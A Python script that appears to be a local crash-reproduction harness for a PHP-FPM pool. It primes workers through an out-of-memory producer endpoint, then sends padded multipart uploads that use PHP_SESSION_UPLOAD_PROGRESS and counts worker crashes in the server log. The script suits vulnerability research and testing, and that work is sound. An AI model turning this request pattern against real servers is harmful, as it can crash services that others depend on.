#!/usr/bin/env python3
# Batch crash-oracle on a stock dynamic pool: prime N workers, then N consumers.
import socket, sys, time, argparse, re, os, threading

B = "----bgBoundary7MA4YWxkTrZu0gW"

def http(port, path, body=None, ctype=None, timeout=30):
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    t0 = time.time()
    if body is None:
        req = f"GET {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nConnection: close\r\n\r\n".encode()
    else:
        req = (f"POST {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
               f"Content-Type: {ctype}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    try:
        s.sendall(req)
        data = b""
        while True:
            x = s.recv(65536)
            if not x: break
            data += x
    except Exception:
        data = b""
    s.close()
    dt = (time.time() - t0) * 1000
    status = data.split(b"\r\n", 1)[0].decode("latin1") if data else "NO-RESPONSE"
    return status, dt, data

def multipart(sid, pad):
    parts = []
    def field(n, v):
        parts.append(f"--{B}\r\nContent-Disposition: form-data; name=\"{n}\"\r\n\r\n".encode())
        parts.append(v if isinstance(v, bytes) else v.encode())
        parts.append(b"\r\n")
    field("PHPSESSID", sid)
    if pad: field("pad", pad)
    field("PHP_SESSION_UPLOAD_PROGRESS", "bgupload")
    parts.append(f"--{B}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\nContent-Type: text/plain\r\n\r\n".encode())
    parts.append(b"A"); parts.append(b"\r\n--%s--\r\n" % B.encode())
    return b"".join(parts), f"multipart/form-data; boundary={B}"

ap = argparse.ArgumentParser()
ap.add_argument("--port", type=int, required=True)
ap.add_argument("--log", required=True)
ap.add_argument("--n", type=int, default=5)
ap.add_argument("--batches", type=int, default=2)
ap.add_argument("--pad-len", type=int, default=900000)
ap.add_argument("--sid", default="padsid1")
a = ap.parse_args()
pad = b"A" * a.pad_len
body, ctype = multipart(a.sid, pad)

def crashes():
    try:
        return sum(1 for l in open(a.log, errors="replace") if "exited on signal" in l)
    except FileNotFoundError:
        return 0

for b in range(a.batches):
    c0 = crashes()
    t0 = time.time()
    # prime all workers concurrently
    ts = [None]*a.n
    def prod(i):
        ts[i] = http(a.port, "/producer_oom.php?n=8000000")[0]
    th = [threading.Thread(target=prod, args=(i,)) for i in range(a.n)]
    [t.start() for t in th]; [t.join() for t in th]
    t_prod = (time.time() - t0) * 1000
    t1 = time.time()
    codes = [None]*a.n
    def cons(i):
        st, dt, data = http(a.port, "/consumer.php", body, ctype)
        codes[i] = st.split(" ")[1] if " " in st else st
    th = [threading.Thread(target=cons, args=(i,)) for i in range(a.n)]
    [t.start() for t in th]; [t.join() for t in th]
    t_cons = (time.time() - t1) * 1000
    time.sleep(0.15)
    t_end = time.time()
    print(f"batch {b}: producers={ts} {t_prod:.0f}ms consumers={codes} {t_cons:.0f}ms "
          f"crashes={crashes()-c0}/{a.n} wall={(t_end-t0)*1000:.0f}ms", flush=True)
